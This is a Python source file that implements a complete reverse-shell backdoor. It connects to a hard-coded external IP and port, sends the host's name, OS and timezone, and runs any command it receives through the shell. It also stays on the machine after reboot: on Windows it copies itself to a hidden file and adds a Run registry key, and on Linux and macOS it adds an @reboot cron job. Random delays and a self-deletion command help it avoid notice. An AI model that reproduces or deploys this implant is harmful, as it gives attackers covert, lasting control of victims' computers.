# -*- coding: utf-8 -*-
import socket
import subprocess
import os
import sys
import time
import random
import platform
import string
import shutil  # For copying the file
from datetime import datetime
import ctypes  # For setting file attribute on Windows

# Configuration to match your multi/handler settings
LHOST = '18.143.130.72'
LPORT = 8888

def get_timezone_offset():
    if time.localtime().tm_isdst and time.daylight:
        offset_sec = -time.altzone
    else:
        offset_sec = -time.timezone
    offset_h = int(offset_sec / 3600)
    return f"GMT{offset_h:+03d}"

new_script_name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(12)) + '.pyw'
new_script_path = ''

def add_to_startup():
    global new_script_path
    """Add script to auto-start using OS-specific methods."""
    os_name = platform.system().lower()
    original_script_path = os.path.realpath(sys.argv[0])
    wait_time = random.randint(1, 5)
    time.sleep(wait_time)  # Random wait before adding persistence

    if 'win' in os_name:
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        new_script_path = os.path.join(documents_path, new_script_name)
        
        shutil.copy2(original_script_path, new_script_path)
        
        # Hide the file by setting its attribute to hidden
        ctypes.windll.kernel32.SetFileAttributesW(new_script_path, 0x02)
        
        import winreg as reg
        key_name = new_script_name[:-4]
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, key_name, 0, reg.REG_SZ, new_script_path)
        except Exception as e:
            print(f"Failed to add to registry on Windows: {e}")

    else:
        # For Linux and macOS
        new_script_path = os.path.join(os.path.expanduser('~'), '.config', new_script_name)
        shutil.copy2(original_script_path, new_script_path)

        # Making the script executable
        os.chmod(new_script_path, 0o775)

        # Adding a cron job for persistence
        cron_command = f"@reboot /usr/bin/env python3 '{new_script_path}'\n"
        try:
            subprocess.run(['crontab', '-l'], check=True, capture_output=True, text=True).stdout + cron_command
            subprocess.run(['crontab', '-'], input=cron_command, text=True)
        except subprocess.CalledProcessError:
            subprocess.run(['crontab', '-'], input=cron_command, text=True)

def attempt_reconnect():
    """Attempt to reconnect indefinitely with backoff."""
    while True:
        try:
            wait_time = random.randint(1, 10)
            time.sleep(wait_time)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            return s
        except socket.error:
            continue

def cleanup_and_exit():
    """Remove persistence mechanisms and delete the script itself."""
    if platform.system().lower() == 'win':
        # Remove registry entry
        try:
            import winreg as reg
            with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE) as key:
                reg.DeleteValue(key, new_script_name[:-4])
        except WindowsError as e:
            print(f"Failed to remove registry entry: {e}")

    # Attempt to remove the script file
    try:
        os.remove(new_script_path)
    except OSError as e:
        print(f"Failed to delete script: {e}")

    sys.exit(0)

def reverse_shell():
    add_to_startup()
    
    s = attempt_reconnect()
    current_time = datetime.now().strftime("%d%m%y_%H%M")
    timezone_offset = get_timezone_offset()
    identification = f"{socket.gethostname()} {platform.system()} {platform.release()} {current_time} {timezone_offset} Connected"
    s.send(identification.encode())

    while True:
        try:
            command = s.recv(1024).decode('utf-8').strip()
            sleep_time = random.randint(1, 5)
            time.sleep(sleep_time)

            if command.lower() == 'exit' or command.lower() == 'getawaycar':
                cleanup_and_exit()
                
            if command:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                s.send(result)
        except Exception as e:
            s.close()
            s = attempt_reconnect()
            s.send(identification.encode())

if __name__ == '__main__':
    reverse_shell()
